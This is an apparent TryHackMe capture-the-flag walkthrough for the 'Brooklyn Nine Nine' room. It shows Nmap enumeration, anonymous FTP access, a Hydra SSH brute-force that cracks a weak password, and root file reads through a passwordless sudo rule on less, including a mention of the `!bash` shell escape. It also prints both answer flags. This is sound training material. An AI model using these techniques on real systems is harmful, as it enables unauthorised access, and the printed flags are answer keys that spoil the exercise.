# Brooklyn Nine Nine — TryHackMe Walkthrough

> This room is aimed at beginner level hackers but anyone can try to hack this box. There are two main intended ways to root the box.

<p align="center">
  <<a href="https://imgbb.com/"><img src="https://i.ibb.co/q3D1gLxc/95b2fab20e29a6d22d6191a789dcbe1f.jpg" alt="95b2fab20e29a6d22d6191a789dcbe1f" border="0"></a>
</p>

<p align="center">
  <a href="https://tryhackme.com/room/brooklynninenine">
    <img src="https://img.shields.io/badge/TryHackMe-Brooklyn%20Nine%20Nine-red?logo=tryhackme&logoColor=white">
  </a>
  <img src="https://img.shields.io/badge/Difficulty-Easy-green">
  <img src="https://img.shields.io/badge/Platform-Linux-black">
  <img src="https://img.shields.io/badge/Focus-FTP%20%7C%20SSH%20Brute%20Force%20%7C%20GTFOBins-blue">
</p>

---

## Topics Covered

| # | Topic |
|---|-------|
| 1 | Network Enumeration |
| 2 | FTP Enumeration |
| 3 | Brute Forcing — SSH |
| 4 | Security Misconfiguration — Sudo `less` |

---

## Learning Objectives

By the end of this walkthrough, you will be able to:

- Identify open ports and enumerate services using Nmap
- Connect to an anonymous FTP share and download files
- Extract usernames from plaintext notes found on the server
- Brute-force SSH credentials using Hydra and a wordlist
- Enumerate sudo permissions and exploit `less` via GTFOBins to read protected files

---

## Prerequisites

- Basic familiarity with Linux terminal commands
- Nmap, Hydra, and an FTP client installed
- Target machine running on TryHackMe (replace `Machine_IP` with your assigned IP)

---

## Task 1 — Deploy and Get Hacking

---

### Step 1 — Network Enumeration

**Approach:** Run an aggressive Nmap scan to identify all open ports and services on the target.

```
kali@kali:~/CTFs/tryhackme/Brooklyn Nine Nine$ sudo nmap -A -Pn -sS -sC -sV -O Machine_IP
[sudo] password for kali:
Starting Nmap 7.80 ( https://nmap.org ) at 2020-10-14 11:07 CEST
Nmap scan report for Machine_IP
Host is up (0.037s latency).
Not shown: 997 closed ports
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_-rw-r--r--    1 0        0             119 May 17 23:17 note_to_jake.txt
| ftp-syst:
|   STAT:
| FTP server status:
|      Connected to ::ffff:10.8.106.222
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 1
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 16:7f:2f:fe:0f:ba:98:77:7d:6d:3e:b6:25:72:c6:a3 (RSA)
|   256 2e:3b:61:59:4b:c4:29:b5:e8:58:39:6f:6f:e9:9b:ee (ECDSA)
|_  256 ab:16:2e:79:20:3c:9b:0a:01:9c:8c:44:26:01:58:04 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-title: Site doesn't have a title (text/html).
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 27.22 seconds
```

> **Note:** Three ports are open — **FTP on 21**, **SSH on 22**, and **HTTP on 80**. Nmap immediately flags that anonymous FTP login is allowed and reveals a file called `note_to_jake.txt` sitting in the FTP root. This is our first target. Always read what Nmap's default scripts (`-sC`) report — they often do significant work for you before you even start manual enumeration.

---

### Step 2 — FTP Enumeration and File Download

**Approach:** Connect to the FTP server anonymously (username: `anonymous`, blank password) and download the note.

```
kali@kali:~/CTFs/tryhackme/Brooklyn Nine Nine$ ftp Machine_IP
Connected to Machine_IP.
220 (vsFTPd 3.0.3)
Name (Machine_IP:kali): anonymous
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
-rw-r--r--    1 0        0             119 May 17 23:17 note_to_jake.txt
226 Directory send OK.
ftp> get note_to_jake.txt
local: note_to_jake.txt remote: note_to_jake.txt
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for note_to_jake.txt (119 bytes).
226 Transfer complete.
119 bytes received in 0.08 secs (1.4283 kB/s)
ftp> exit
221 Goodbye.
kali@kali:~/CTFs/tryhackme/Brooklyn Nine Nine$ cat note_to_jake.txt
From Amy,

Jake please change your password. It is too weak and holt will be mad if someone hacks into the nine nine
```

> **Note:** The note is written from Amy to Jake, warning him that his password is too weak. This gives us a confirmed username — **`jake`** — and tells us his password is weak enough to appear in a common wordlist. This is exactly the kind of information disclosure that makes FTP shares on internet-facing servers so dangerous. The next step is to brute-force SSH using Jake's username.

---

### Step 3 — SSH Brute-Force with Hydra

**Approach:** Use Hydra to brute-force SSH for user `jake` using the `rockyou.txt` wordlist.

```
kali@kali:~/CTFs/tryhackme/Brooklyn Nine Nine$ hydra -l jake -P /usr/share/wordlists/rockyou.txt ssh://Machine_IP
Hydra v9.0 (c) 2019 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2020-10-14 11:11:30
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task
[DATA] attacking ssh://Machine_IP:22/
[22][ssh] host: Machine_IP   login: jake   password: 987654321
```

> **Note:** Hydra cracks Jake's password as **`987654321`** — a sequential number string that appears near the top of `rockyou.txt`, confirming it is exactly as weak as Amy's note warned. The credentials are: **`jake:987654321`**.

---

### Step 4 — SSH Login, Home Directory Enumeration, and User Flag

**Approach:** Log in via SSH as `jake` and enumerate the system. Jake's home directory is empty, but listing `/home` reveals other users. The user flag is in `holt`'s home directory and is world-readable.

```
kali@kali:~/CTFs/tryhackme/Brooklyn Nine Nine$ ssh jake@Machine_IP
The authenticity of host 'Machine_IP' can't be established.
ECDSA key fingerprint is SHA256:Ofp49Dp4VBPb3v/vGM9jYfTRiwpg2v28x1uGhvoJ7K4.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added 'Machine_IP' (ECDSA) to the list of known hosts.
jake@Machine_IP's password:
Last login: Tue May 26 08:56:58 2020
jake@brookly_nine_nine:~$ ls -la
total 44
drwxr-xr-x 6 jake jake 4096 May 26 09:01 .
drwxr-xr-x 5 root root 4096 May 18 10:21 ..
-rw------- 1 root root 1349 May 26 09:01 .bash_history
-rw-r--r-- 1 jake jake  220 Apr  4  2018 .bash_logout
-rw-r--r-- 1 jake jake 3771 Apr  4  2018 .bashrc
drwx------ 2 jake jake 4096 May 17 21:36 .cache
drwx------ 3 jake jake 4096 May 17 21:36 .gnupg
drwxrwxr-x 3 jake jake 4096 May 26 08:57 .local
-rw-r--r-- 1 jake jake  807 Apr  4  2018 .profile
drwx------ 2 jake jake 4096 May 18 14:29 .ssh
jake@brookly_nine_nine:~$ ls -l /home
total 12
drwxr-xr-x 5 amy  amy  4096 May 18 10:23 amy
drwxr-xr-x 6 holt holt 4096 May 26 09:01 holt
drwxr-xr-x 6 jake jake 4096 May 26 09:01 jake
jake@brookly_nine_nine:~$ ls -la /home/holt
total 48
drwxr-xr-x 6 holt holt 4096 May 26 09:01 .
drwxr-xr-x 5 root root 4096 May 18 10:21 ..
-rw-rw-r-- 1 holt holt   33 May 17 21:49 user.txt
jake@brookly_nine_nine:~$ cat /home/holt/user.txt
ee11cbb19052e40b07aac0ca060c23ee
```

> **Note:** Jake's own home directory contains no flags. Checking `/home` reveals three users — `amy`, `holt`, and `jake`. The `user.txt` in `holt`'s directory has permissions `-rw-rw-r--` — the final `r` means it is **world-readable**, so `jake` can read it without needing to be `holt`. Always check the permissions of files in other users' home directories before assuming they are inaccessible.

---

### Question 1 — User flag

<details>
<summary>Reveal Answer</summary>

**`ee11cbb19052e40b07aac0ca060c23ee`**

</details>

---

### Step 5 — Privilege Escalation via Misconfigured Sudo on less

**Approach:** Run `sudo -l` to check what `jake` can run with elevated privileges. The output shows `less` can be run as root without a password. Use `less` to directly read the root flag.

```
jake@brookly_nine_nine:~$ sudo -l
Matching Defaults entries for jake on brookly_nine_nine:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User jake may run the following commands on brookly_nine_nine:
    (ALL) NOPASSWD: /usr/bin/less
jake@brookly_nine_nine:~$ sudo /usr/bin/less /root/root.txt
-- Creator : Fsociety2006 --
Congratulations in rooting Brooklyn Nine Nine
Here is the flag: 63a9f0ea7bb98050796b649e85481845

Enjoy!!
```

> **Note:** `less` is a file pager — it can open and display any file on the system. When run with `sudo`, it has root-level read access to every file, including `/root/root.txt`. This is documented on [GTFOBins/less](https://gtfobins.github.io/gtfobins/less/#sudo). Beyond simply reading files, `less` also supports shell escape via `!bash` — typing `!bash` while inside a `less` session would spawn a full root shell. For this room, simply reading the flag file directly is sufficient.

---

### Question 2 — Root flag

<details>
<summary>Reveal Answer</summary>

**`63a9f0ea7bb98050796b649e85481845`**

</details>

---

## Summary

| Step | Action | Result |
|------|--------|--------|
| 1 | Nmap scan | Found FTP (21), SSH (22), HTTP (80) — anonymous FTP login allowed |
| 2 | Anonymous FTP login | Downloaded `note_to_jake.txt` |
| 3 | Read note | Identified username `jake` with a weak password |
| 4 | Hydra SSH brute-force with `rockyou.txt` | Cracked `jake:987654321` |
| 5 | SSH login as `jake` | Gained shell access |
| 6 | Checked `/home` directory listing | Found `holt/user.txt` is world-readable |
| 7 | Read `holt/user.txt` | Found user flag |
| 8 | `sudo -l` enumeration | Found passwordless sudo rule for `/usr/bin/less` |
| 9 | `sudo less /root/root.txt` | Read root flag directly via GTFOBins less technique |
